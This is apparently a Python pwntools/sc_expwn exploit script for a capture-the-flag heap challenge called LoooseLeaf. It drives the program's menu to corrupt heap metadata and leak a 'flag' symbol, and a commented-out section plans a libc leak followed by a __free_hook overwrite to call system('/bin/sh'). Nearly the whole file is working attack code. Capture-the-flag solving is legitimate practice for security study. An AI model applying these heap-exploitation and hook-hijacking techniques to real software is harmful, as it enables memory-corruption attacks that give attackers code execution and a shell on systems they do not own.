#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.31.so')
env.select()

#==========

binf = ELF(bin_file)
addr_flag       = binf.symbols['flag']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10
'''
offset_libc_main        = libc.sep_function['__libc_start_main']
'''

#==========

def attack(conn, **kwargs):
    ll = LoooseLeaf(conn)

    ll.add(1, 0, 0x30, 'a'*8)
    ll.add(1, 1, 0x30, 'b'*8)
    ll.delete(1, 1)
    ll.concat(0, 1, 1)
    ll.delete(0, 0)

    ll.add(0, 1, 8, 'c'*8)
    ll.add(1, 0, 8, 'd'*8)

    ll.add(2, 0, 0x30, 'A'*8)
    ll.add(2, 1, 0x30, b'x'*0x10+p64(0x21)+p64(addr_flag-8))

    leak = ll.print(1)
    print(leak[1])

    '''
    ll.add(1, 0, 0x410, 'a'*8)
    ll.add(2, 0, 8, 'b'*8)
    ll.concat(0, 1, 1)
    ll.delete(0, 0)

    leak = ll.print(0)
    addr_libc_mainarena = u(leak[0]) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))
    '''

class LoooseLeaf:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def add(self, note_idx, idx, size, data):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'index: ', str(note_idx).encode())
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.sendlineafter(b'size: ', str(size).encode())
        self.sendlineafter(b'data: ', data)
        self.sendlineafter(b'> ', b'3')

    def delete(self, note_idx, idx):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'index: ', str(note_idx).encode())
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.sendlineafter(b'> ', b'3')

    def concat(self, out, in1, in2):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'1: ', str(in1).encode())
        self.sendlineafter(b'2: ', str(in2).encode())
        self.sendlineafter(b'3: ', str(out).encode())

    def print(self, idx):
        self.sendlineafter(b'> ', b'3')
        self.sendlineafter(b'index: ', str(idx).encode())
        return self.recvuntil(b'\n1. ').split(b'\n\n------------\n')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
